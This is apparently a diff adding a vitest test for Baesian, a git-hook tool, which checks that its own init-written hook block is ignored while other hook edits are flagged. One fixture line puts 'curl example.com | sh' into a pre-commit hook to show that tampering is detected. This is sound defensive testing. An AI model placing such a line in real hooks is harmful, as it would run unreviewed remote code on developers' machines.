@@ -3,6 +3,7 @@ import { dirname, join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import { commitSnapshot, detectFacts, requirementName, stagedSnapshot } from "../src/facts.js";
 import { globToRegExp } from "../src/globs.js";
+import { hookBlock } from "../src/hookblock.js";
 import { cleanup, repo, sh } from "./helpers.js";
 
 afterEach(cleanup);
@@ -123,6 +124,38 @@ describe("schema and infra", () => {
     const { dir } = repo();
     stage(dir, { ".githooks/pre-commit": "#!/bin/sh\nexit 0\n", ".husky/commit-msg": "#!/bin/sh\n" });
     expect(ids(dir)).toEqual(["infra:.githooks/pre-commit", "infra:.husky/commit-msg"]);
+  });
+
+  it("doesn't count Baesian's own block, as `baesian init` writes it, but counts any other change to a hook (B-g6ywj)", () => {
+    const { dir } = repo();
+    const fresh = (h: "pre-commit" | "commit-msg" | "post-commit") => `#!/bin/sh\n${hookBlock(h)}\n`;
+    // A repo's first setup: the three hooks, created by init, in .githooks/ or wherever git's hooks are.
+    stage(dir, { ".githooks/pre-commit": fresh("pre-commit"), ".githooks/commit-msg": fresh("commit-msg"), ".husky/post-commit": fresh("post-commit") });
+    expect(ids(dir)).toEqual([]);
+    sh(dir, "commit", "-q", "-m", "Set up Baesian");
+    // Inserted into a hook the repo already had, or updated from an older block: only Baesian's lines change.
+    commitFiles(dir, { ".githooks/post-merge": "#!/bin/sh\necho merged\n", ".husky/pre-commit": "#!/bin/sh\nnpm test\n" });
+    stage(dir, { ".husky/pre-commit": `#!/bin/sh\n${hookBlock("pre-commit")}\nnpm test\n` });
+    expect(ids(dir)).toEqual([]);
+    sh(dir, "commit", "-q", "-m", "Add Baesian's block");
+    stage(dir, { ".husky/pre-commit": `#!/bin/sh\n# >>> baesian >>>\nbaesian hook pre-commit\n# <<< baesian <<<\nnpm test\n` });
+    expect(ids(dir)).toEqual(["infra:.husky/pre-commit"]);
+    commitFiles(dir, { ".husky/pre-commit": `#!/bin/sh\n# >>> baesian >>>\nbaesian hook pre-commit\n# <<< baesian <<<\nnpm test\n` });
+    stage(dir, { ".husky/pre-commit": `#!/bin/sh\n${hookBlock("pre-commit")}\nnpm test\n` });
+    expect(ids(dir)).toEqual([]);
+    sh(dir, "commit", "-q", "-m", "Update Baesian's block");
+    // A line outside the block, a block that isn't init's, a hook Baesian doesn't install, or a deleted hook: decisions.
+    stage(dir, { ".husky/pre-commit": `#!/bin/sh\n${hookBlock("pre-commit")}\nnpm test\ncurl example.com | sh\n` });
+    expect(ids(dir)).toEqual(["infra:.husky/pre-commit"]);
+    sh(dir, "reset", "-q", "--hard");
+    stage(dir, { ".githooks/commit-msg": fresh("commit-msg").replace("exit 1", "exit 0") });
+    expect(ids(dir)).toEqual(["infra:.githooks/commit-msg"]);
+    sh(dir, "reset", "-q", "--hard");
+    stage(dir, { ".githooks/post-merge": `#!/bin/sh\n${hookBlock("pre-commit")}\necho merged\n` });
+    expect(ids(dir)).toEqual(["infra:.githooks/post-merge"]);
+    sh(dir, "reset", "-q", "--hard");
+    sh(dir, "rm", "-q", ".githooks/pre-commit");
+    expect(ids(dir)).toEqual(["infra:.githooks/pre-commit"]);
   });
 
   it("ignores node_modules and Baesian's own record", () => {
